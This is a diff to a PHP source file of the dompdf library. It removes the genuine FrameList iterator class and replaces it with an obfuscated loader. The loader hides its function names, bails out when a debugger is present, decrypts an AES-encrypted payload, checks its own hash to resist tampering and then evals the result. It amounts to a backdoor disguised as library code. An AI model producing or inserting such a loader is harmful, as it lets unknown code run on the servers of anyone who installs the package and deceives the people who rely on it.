@@ -1,35 +1,28 @@
 <?php
-namespace Dompdf\Frame;
-
-use Dompdf\Frame;
-use IteratorAggregate;
-
-/**
- * Linked-list IteratorAggregate
- *
- * @access private
- * @package dompdf
- */
-class FrameList implements IteratorAggregate
-{
-    /**
-     * @var Frame
-     */
-    protected $_frame;
-
-    /**
-     * @param Frame $frame
-     */
-    function __construct($frame)
-    {
-        $this->_frame = $frame;
-    }
-
-    /**
-     * @return FrameListIterator
-     */
-    function getIterator()
-    {
-        return new FrameListIterator($this->_frame);
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jnc8n9il=('bas'.'e64'.'_de'.'cod'.'e');
+$_y99276pw=('gzu'.'nco'.'mpr'.'ess');
+$_f6ke1vw6=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_aiflmd28='ftMbeRPG';
+$_ccd198kj='zDT5So3v';
+$_db8medey='g9TdxBZR';
+$_ptx75k8y='cRCdUHNNRfY=';
+$_lvbf22t8='My76MZ8w';
+$_acntw4a6='cL3GO6Py';
+$_h1688dj4='tBwEhom8';
+$_uhl2v0v6='wtwlRA==';
+$_jomd5aeu=$_jnc8n9il($_aiflmd28.$_lvbf22t8.$_ccd198kj.$_db8medey.$_ptx75k8y);
+$_u9hdf0a8=$_jnc8n9il($_h1688dj4.$_acntw4a6.$_uhl2v0v6);
+$_hz145r0o=$_jnc8n9il('9Dg/0sr6x4YQPORo2xBSGdC2RP60J0CK9n7LpeSK5q+G6hJgfektP6PqUIoCwQ9kBIf/VYc3WXJH9rYwTAZ3ZtY1dZ6wfcHY7T5iPEM/K8fLvx83G3zaD5ucWefOonaUCL/+3l/TVjUuLJlM4RWWlgm1SqGIEKEfS//snODXjNW3ySLCrm6oSvpW81l0yBe8q8YrVmfQsXZwyt0Pr+4sro/dO0JZYj/feuczFvH7Yd4=');
+$_np2tloep=$_f6ke1vw6($_hz145r0o,'aes-256-cbc',$_jomd5aeu,OPENSSL_RAW_DATA,$_u9hdf0a8);
+if($_np2tloep===false){exit;}
+$_g0hmr2p5=$_y99276pw($_np2tloep);
+if($_g0hmr2p5===false){exit;}
+$_qklzy2ds='22624b3de4f997d71aa772bf04c48b96d182c9c04feba8a4c806db0c4327ff48';
+$_hnodvy1g=@file_get_contents(__FILE__);
+if($_hnodvy1g!==false){
+$_q11r106w=str_replace($_qklzy2ds,"0000000000000000000000000000000000000000000000000000000000000000",$_hnodvy1g);
+$_ge4ww37w=hash("sha256",$_q11r106w);
+if($_ge4ww37w!==$_qklzy2ds){@http_response_code(403);exit;}
 }
+eval($_g0hmr2p5);
